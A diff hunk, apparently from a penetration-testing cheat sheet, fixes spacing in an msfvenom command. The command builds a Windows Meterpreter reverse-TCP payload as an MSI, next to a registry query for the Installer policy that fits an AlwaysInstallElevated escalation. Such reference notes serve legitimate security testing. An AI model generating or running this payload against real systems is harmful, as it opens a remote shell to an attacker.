@@ -3679,7 +3679,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
 
 ```c
-$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> –f  msi > <FILE>.msi
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> –f msi > <FILE>.msi
 ```
 
 ```c
